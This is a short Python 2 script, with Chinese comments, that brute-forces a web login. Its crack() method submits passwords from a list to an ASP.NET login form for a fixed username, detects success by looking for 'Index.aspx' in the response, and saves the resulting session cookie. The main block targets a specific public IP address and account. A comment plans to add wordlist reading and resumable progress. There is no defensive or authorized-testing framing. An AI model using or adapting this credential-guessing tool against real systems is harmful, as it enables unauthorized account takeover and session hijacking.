#!/usr/bin/python
#coding=utf8
#filename:web_auth_cookie_tmp.py
"""
需要增加1：从文本文件中读取密码，并用一个文件来保存当前读取到的位置，
下一次可以判断有无记录位置的文件，作为进度保存。
"""
import urllib
import urllib2
import cookielib
import httplib
import time

class Auth_Cookie():
    def __init__(self, url, cookie_file, user_agent, username):
        """
        url ==> url to test
        cookie_file ==> file of save cookie
        user_agent ==> http client agent
        """
        client_headers = {'User-Agent':user_agent}
        self.cookiejar = cookielib.MozillaCookieJar(cookie_file)
        self.cookieproc = urllib2.HTTPCookieProcessor(self.cookiejar)
        self.opener = urllib2.build_opener(self.cookieproc)
        self.req = urllib2.Request(url, client_headers)
        self.user_crack = username
    def crack(self, pwd_list):
        """
        pwd_list ==> ['111', '222', .....]
        req = urllib2.Request(url=arg1, headers=client_headers, data=pwd_encode)      """
        for key1 in pwd_list:
            pwd_encode = urllib.urlencode({'userName':self.user_crack,
                                           'passWord':key1,
                                           'login':'true',
                                           'validCode':''})
            try:
                response = self.opener.open(self.req, pwd_encode)
            except urllib2.HTTPError, e:
                print "at opener.open, raise ERROR"
                return
            response_resu = response.getcode()
            """print "result:",type(response_resu),response_resu"""
            if response_resu == 200:
                response_html = response.read()
                """"""
                print response_html
                """
                print type(response_html)
                return response_html
                """
                case = response_html.find('Index.aspx')
                if case == -1:
                    print "false.....", key1
                else:
                    print "find the key:", key1
                    self.cookiejar.save()
                    return response

        return "error"
"""
>> aaa1.headers.values()
['39', '4.0.30319', 'ASP.NET_SessionId=r4zfwuvtfji5gmkwkht2vszg; path=/; HttpOnly', 'ASP.NET', 'Microsoft-IIS/7.5', 'close
', 'private', 'Mon, 30 Sep 2013 13:05:08 GMT', 'text/html; charset=utf-8']

>>> aaa1.headers.values()
['39', '4.0.30319', 'ASP.NET_SessionId=ynuzf2wkehrkffgn1x0u4tze; path=/; HttpOnly', 'ASP.NET', 'Microsoft-IIS/7.5', 'close
', 'private', 'Mon, 30 Sep 2013 13:05:08 GMT', 'text/html; charset=utf-8']
"""

if __name__ == "__main__":
    url11 = "http://220.166.21.41:8189/Default.aspx"
    file11 = "/tmp/cookie11.txt"
    agent11 = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
    dict11 = {'a1':'sss', 'a2':'dddd', 'username':'scbh001',}
    pwd11 = ['aaa', 'bbb', 'ksksie','ssdssw','scbh001']
    aaa1 = ""
    s11 = Auth_Cookie(url11, file11, agent11, 'scbh001')
    s11.crack(pwd11)

def test():
    global aaa1
    s11 = Auth_Cookie(url11, file11, agent11, 'scbh001')
    aaa1 = s11.crack(pwd11)
